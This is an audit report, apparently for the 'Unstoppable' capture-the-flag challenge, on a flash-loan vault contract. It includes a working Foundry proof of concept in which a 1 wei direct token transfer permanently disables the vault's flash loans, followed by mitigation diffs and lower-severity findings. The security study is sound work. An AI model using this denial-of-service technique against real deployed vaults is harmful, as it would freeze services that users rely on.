## High

### [H-1] Direct token transfer to the vault breaks the ERC4626 invariant and permanently disable all flash loans (Denial of Service)

**Description:**

`UnstoppableVault` measure how many assets it holds with `totalAssets()`, which simply read the raw token balance of the contract:

```solidity
// src/unstoppable/UnstoppableVault.sol:71-73
function totalAssets() public view override nonReadReentrant returns (uint256) {
    return asset.balanceOf(address(this));
}
```

Inside `flashLoan()` there is a strict equality check that compare the share accounting against that raw balance:

```solidity
// src/unstoppable/UnstoppableVault.sol:84-85
uint256 balanceBefore = totalAssets();
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

The check assume the token balance of the vault is always exactly equal to `convertToShares(totalSupply)`. That assumption only hold while tokens enter the vault through `deposit()` / `mint()`, because those function mint shares at the same time.

Nothing stop anyone from sending tokens straight to the vault with a plain ERC20 `transfer()`. A direct transfer increase `asset.balanceOf(vault)` (so `totalAssets()` and `balanceBefore` go up), but it does not mint any shares, so `totalSupply` stay the same. The two side of the equality drift apart permanantly, and every future `flashLoan()` call revert with `InvalidBalance()`.

Because the value can never be brought back into sync by any normal user action, the flash loan feature, which is the core purpose of the vault, is bricked forever. The on chain monitor (`UnstoppableMonitor`) then detect the failure, pause the vault, and hand ownership back to the deployer.

Location is in `src/unstoppable/UnstoppableVault.sol:71-73` for `totalAssets()`, and `src/unstoppable/UnstoppableVault.sol:84-85` for the invariant check inside `flashLoan()`.

**Impact:**

Likelihood is High. The attack cost as little as 1 wei of the token, it need no special permission, and it is done in a single transaction by anyone.

Risk is also High. It permanently disable the protocol only feature (flash loans), so this is a full Denial of Service of the vault. Overall severity is High.

**Proof of Concept:**

The player start with 10 DVT tokens. They send a single wei of DVT directly to the vault. After that, the flash loan invariant check fail and the vault can no longer serve flash loans. The monitor react by pausing the vault and returning ownership to the deployer.

```solidity
function test_breakInvariantWithDirectTransfer() public {
    console.log("BEFORE ATTACK");
    console.log("vault totalAssets :", vault.totalAssets());
    console.log("vault totalSupply :", vault.totalSupply());
    console.log("convertToShares(totalSupply):", vault.convertToShares(vault.totalSupply()));
    console.log("player balance    :", token.balanceOf(player));

    // Attack: a single direct token transfer desynchronizes assets from shares.
    vm.prank(player);
    token.transfer(address(vault), 1);

    console.log("AFTER ATTACK (transferred 1 wei of DVT directly)");
    console.log("vault totalAssets :", vault.totalAssets());
    console.log("vault totalSupply :", vault.totalSupply());
    console.log("convertToShares(totalSupply):", vault.convertToShares(vault.totalSupply()));

    // The flashLoan invariant check now reverts with InvalidBalance().
    // (We call flashLoan directly because the monitor swallows the revert in a try/catch.)
    vm.prank(player);
    vm.expectRevert(UnstoppableVault.InvalidBalance.selector);
    vault.flashLoan(monitorContract, address(token), 100e18, bytes(""));
    console.log("flashLoan now reverts with InvalidBalance() -> vault is bricked");
}

function test_monitorPausesAndHandsOverOwnership() public {
    // Attack
    vm.prank(player);
    token.transfer(address(vault), 1);

    // Monitor detects the broken flash loan, pauses, and returns ownership.
    vm.prank(deployer);
    vm.expectEmit();
    emit UnstoppableMonitor.FlashLoanStatus(false);
    monitorContract.checkFlashLoan(100e18);

    assertTrue(vault.paused(), "Vault is not paused");
    assertEq(vault.owner(), deployer, "Vault owner not restored to deployer");
    console.log("Vault paused:", vault.paused());
    console.log("Vault owner restored to deployer:", vault.owner() == deployer);
}
```

Console output from `forge test --match-path test/unstoppable/UnstoppablePoC.t.sol -vv`:

```
Ran 2 tests for test/unstoppable/UnstoppablePoC.t.sol:UnstoppablePoC
[PASS] test_breakInvariantWithDirectTransfer() (gas: 59772)
Logs:
  BEFORE ATTACK
  vault totalAssets : 1000000000000000000000000
  vault totalSupply : 1000000000000000000000000
  convertToShares(totalSupply): 1000000000000000000000000
  player balance    : 10000000000000000000
  AFTER ATTACK (transferred 1 wei of DVT directly)
  vault totalAssets : 1000000000000000000000001
  vault totalSupply : 1000000000000000000000000
  convertToShares(totalSupply): 999999999999999999999999
  flashLoan now reverts with InvalidBalance() -> vault is bricked

[PASS] test_monitorPausesAndHandsOverOwnership() (gas: 72049)
Logs:
  Vault paused: true
  Vault owner restored to deployer: true

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

The numbers show the problem clearly. After the 1 wei transfer, `totalAssets` is `...001` while `convertToShares(totalSupply)` round down to `...999`. The two are no longer equal, so the strict check revert.

**Recommended Mitigation:**

Do not compare a value an attacker can freely inflate against internal share accounting with a strict equality. You can pick one of the two approach below.

The simplest fix is to remove the fragile invariant check entirely. The flash loan is already protected by the repayment check at the end (`safeTransferFrom(receiver, this, amount + fee)`), so the strict comparison give no real security benefit.

File: `src/unstoppable/UnstoppableVault.sol`, function `flashLoan()`:

```diff
        uint256 balanceBefore = totalAssets();
-        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

A more complete fix is to track deposited assets with an internal counter, so a direct donation no longer affect the accounting. The counter is updated only inside `deposit`/`mint`/`withdraw`/`redeem` and the flash loan repayment, instead of reading the live token balance.

File: `src/unstoppable/UnstoppableVault.sol`, function `totalAssets()`:

```diff
+    uint256 private _internalAssets;
+
     function totalAssets() public view override nonReadReentrant returns (uint256) {
-        return asset.balanceOf(address(this));
+        return _internalAssets;
     }
```

The internal accounting option is the cleaner and more ERC4626 correct fix, because it also protect the share price calculation from donation and inflation tricks.

***

## Low

### [L-1] Owner can execute arbitrary `delegatecall` via `execute()` (centralization / upgrade risk)

**Description:**

```solidity
// src/unstoppable/UnstoppableVault.sol:124-127
function execute(address target, bytes memory data) external onlyOwner whenPaused {
    (bool success,) = target.delegatecall(data);
    require(success);
}
```

While paused, the owner can run any code in the vault own storage context through `delegatecall`. This is intentional ("execute arbitrary changes"), but it mean the owner has unlimited power over funds and storage. A compromised or malicious owner can drain the vault or rewrite any state. This is a strong centralization risk that user of the protocol must be aware of.

Location is `src/unstoppable/UnstoppableVault.sol:124-127`.

**Impact:**

Likelihood is Low, because it require the owner key and the contract to be paused. Risk is Low and centralization related, since it give full owner control over funds and storage.

**Proof of Concept:**

N/A

**Recommended Mitigation:**

If full upgradeability is not truly required, the safest move is to drop the arbitrary `delegatecall` completely and replace it with a small set of explicit.

File: `src/unstoppable/UnstoppableVault.sol`, function `execute()`:

```diff
-    // Allow owner to execute arbitrary changes when paused
-    function execute(address target, bytes memory data) external onlyOwner whenPaused {
-        (bool success,) = target.delegatecall(data);
-        require(success);
-    }
```

If you really do need it, at least gate it behind a timelock and a multisig owner, and document the power clearly so user know about the trust assumption.

### [L-2] Missing zero address validation on `feeRecipient`

**Description:**

`feeRecipient` is set in the constructor and in `setFeeRecipient()` without checking for `address(0)`:

```solidity
// src/unstoppable/UnstoppableVault.sol:116-121
function setFeeRecipient(address _feeRecipient) external onlyOwner {
    if (_feeRecipient != address(this)) {
        feeRecipient = _feeRecipient;
        emit FeeRecipientUpdated(_feeRecipient);
    }
}
```

If `feeRecipient` is ever set to the zero address, flash loan fees are transfered to `address(0)` and lost.

Location is `src/unstoppable/UnstoppableVault.sol:34-40` and `src/unstoppable/UnstoppableVault.sol:116-121`.

**Impact:**

Likelihood is Low, because it require an owner misconfiguration. Risk is Low, with a potential loss of accrued fees.

**Proof of Concept:**

N/A

**Recommended Mitigation:**

Add an explicit zero address check in both the constructor and `setFeeRecipient()`, and declare a new error for it.

File: `src/unstoppable/UnstoppableVault.sol`, error declarations (contract level):

```diff
     error InvalidAmount(uint256 amount);
     error InvalidBalance();
+    error InvalidFeeRecipient();
```

File: `src/unstoppable/UnstoppableVault.sol`, function `setFeeRecipient()`:

```diff
     function setFeeRecipient(address _feeRecipient) external onlyOwner {
+        if (_feeRecipient == address(0)) revert InvalidFeeRecipient();
         if (_feeRecipient != address(this)) {
             feeRecipient = _feeRecipient;
             emit FeeRecipientUpdated(_feeRecipient);
         }
     }
```

File: `src/unstoppable/UnstoppableVault.sol`, function `constructor()`:

```diff
     constructor(ERC20 _token, address _owner, address _feeRecipient)
         ERC4626(_token, "Too Damn Valuable Token", "tDVT")
         Owned(_owner)
     {
+        if (_feeRecipient == address(0)) revert InvalidFeeRecipient();
         feeRecipient = _feeRecipient;
         emit FeeRecipientUpdated(_feeRecipient);
     }
```

## Informational

### [I-1] `UnstoppableMonitor.onFlashLoan()` uses a raw `approve()` and ignore its return value (unsafe ERC20)

**Description:**

```solidity
// src/unstoppable/UnstoppableMonitor.sol:31
ERC20(token).approve(address(vault), amount);
```

Inside `onFlashLoan()` the monitor approve the vault so the vault can pull back the borrowed amount during repayment. It use the raw ERC20 `approve()` and it do not check the boolean that is returned. Some ERC20 tokens do not return a bool at all, and some return `false` on failure instead of reverting. With such a token the approval could silently fail while the call still look successful, and then the repayment `safeTransferFrom` inside the vault would revert. For the DVT token used here this is not exploitable, but it is fragile and it is inconsistent with the `SafeTransferLib` pattern that the vault itself already use.


Location is `src/unstoppable/UnstoppableMonitor.sol:31`.

**Impact:**

Likelihood is Low, because it only matter with non standard tokens. Risk is Informational, it is mostly a code quality.

**Proof of Concept:**

N/A

**Recommended Mitigation:**

Use the safe wrapper from solmate so the call work with non standard tokens and the result is checked.

File: `src/unstoppable/UnstoppableMonitor.sol`, imports:

```diff
 import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 import {Owned} from "solmate/auth/Owned.sol";
+import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";
 import {UnstoppableVault, ERC20} from "../unstoppable/UnstoppableVault.sol";
```

File: `src/unstoppable/UnstoppableMonitor.sol`, function `onFlashLoan()`:

```diff
-        ERC20(token).approve(address(vault), amount);
+        SafeTransferLib.safeApprove(ERC20(token), address(vault), amount);
```

### [I-2] Empty `require()` statements without a descriptive error

**Description:**

Two `require()` checks revert with no reason string, which make debugging and off chain integration harder, and also cost a bit more than a custom error:

```solidity
// src/unstoppable/UnstoppableMonitor.sol:37
require(amount > 0);

// src/unstoppable/UnstoppableVault.sol:126
require(success);
```

Location is `src/unstoppable/UnstoppableMonitor.sol:37` and `src/unstoppable/UnstoppableVault.sol:126`.

**Impact:**

Likelihood is not really applicable here. Risk is Informational.

**Proof of Concept:**

N/A

**Recommended Mitigation:**

Replace the bare `require()` with named custom errors.

File: `src/unstoppable/UnstoppableMonitor.sol`, function `checkFlashLoan()`:

```diff
-        require(amount > 0);
+        if (amount == 0) revert InvalidAmount();
```

File: `src/unstoppable/UnstoppableVault.sol`, function `execute()` (only if you keep this function, see [L-1]):

```diff
-        require(success);
+        if (!success) revert ExecutionFailed();
```


